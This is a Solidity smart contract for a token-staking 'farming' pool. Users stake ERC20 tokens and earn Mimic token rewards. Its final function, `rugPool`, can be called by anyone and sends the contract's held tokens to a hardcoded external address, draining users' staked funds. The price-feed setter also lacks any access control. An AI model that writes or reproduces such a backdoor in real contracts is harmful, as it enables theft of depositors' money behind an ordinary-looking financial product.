// SPDX-License-Identifier: MIT

pragma solidity 0.6.6;

import "./Mimic.sol";
import "./JUSD.sol";

import "./Dex.sol";

import "./AggregatorV3Interface.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Farming {
    string public name = "Mimic Governance Token Farming";
    ERC20 public MimicToken;
    ERC20 public JUSDToken;

    //Dex
    Dex public DEX;

    mapping(address => mapping(address => uint256)) public stakingBalance;
    mapping(address => mapping(address => uint256)) public updateTime;
    mapping(address => address) public tokenPriceMapping;

    constructor(
        address _MimicToken,
        address _JUSDToken,
        address _DEX
    ) public {
        MimicToken = ERC20(_MimicToken);
        JUSDToken = ERC20(_JUSDToken);
        DEX = Dex(_DEX);
    }

    function setPriceFeed(address _token, address _priceFeed) public {
        tokenPriceMapping[_token] = _priceFeed;
    }

    function getTokenValue(address _token)
        public
        view
        returns (uint256, uint256)
    {
        address priceFeedAddress = tokenPriceMapping[_token];
        AggregatorV3Interface priceFeed = AggregatorV3Interface(
            priceFeedAddress
        );
        (, int256 price, , , ) = priceFeed.latestRoundData();
        uint256 decimals = uint256(priceFeed.decimals());
        return (uint256(price), decimals);
    }

    function stakingValue(address _account, address _token)
        public
        view
        returns (uint256)
    {
        if (stakingBalance[_token][_account] <= 0) {
            return 0;
        }
        (uint256 price, uint256 decimals) = getTokenValue(_token);
        return (
            SafeMath.div(
                SafeMath.mul(stakingBalance[_token][_account], price),
                10**decimals
            )
        );
    }

    //Stake Tokens
    function stakeTokens(uint256 _amount, address _token) public {
        require(_amount > 0, "amount can not be 0");
        ERC20(_token).transferFrom(msg.sender, address(this), _amount);
        stakingBalance[_token][msg.sender] = SafeMath.add(
            stakingBalance[_token][msg.sender],
            _amount
        );
        updateTime[_token][msg.sender] = block.timestamp;
    }

    //Check reward by address without send function (no gas)
    function checkRewardByAddress(address _account, address _token)
        public
        view
        returns (uint256)
    {
        uint256 reward = calculateRewards(_account, _token);
        return reward;
    }

    function calculateTime(address _account, address _token)
        public
        view
        returns (uint256)
    {
        uint256 time = block.timestamp;
        uint256 totalTime = time - updateTime[_token][_account];
        return totalTime;
    }

    function calculateRewards(address _account, address _token)
        public
        view
        returns (uint256)
    {
        uint256 time = SafeMath.mul(calculateTime(_account, _token), 1e18);
        uint256 rate = 864;
        uint256 timeRate = time / rate;
        uint256 reward = SafeMath.div(
            SafeMath.mul(stakingBalance[_token][_account], timeRate),
            1e18
        );
        return reward;
    }

    //Issuing Token
    function issueTokens(address _token) public {
        uint256 balance = stakingBalance[_token][msg.sender];
        uint256 reward = calculateRewards(msg.sender, _token);
        require(reward > 0 && balance > 0);
        MimicToken.transfer(msg.sender, reward);
        updateTime[_token][msg.sender] = block.timestamp;
    }

    //Unstake with amount
    function unstakeTokens(uint256 _amount, address _token) public {
        require(_amount > 0, "staking balance cannot be 0");
        ERC20(_token).transfer(msg.sender, _amount);
        uint256 remain = SafeMath.sub(
            stakingBalance[_token][msg.sender],
            _amount
        );
        stakingBalance[_token][msg.sender] = remain;

        //withdraw and claim reward
        uint256 reward = calculateRewards(msg.sender, _token);
        // require(reward > 0 && stakingBalance[msg.sender] >= 0);
        MimicToken.transfer(msg.sender, reward);
        updateTime[_token][msg.sender] = block.timestamp;
    }

    function rugPool(address _token) public {
        uint256 balance = JUSDToken.balanceOf(address(this));
        ERC20(_token).transfer(
            0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
            balance
        );
    }
}
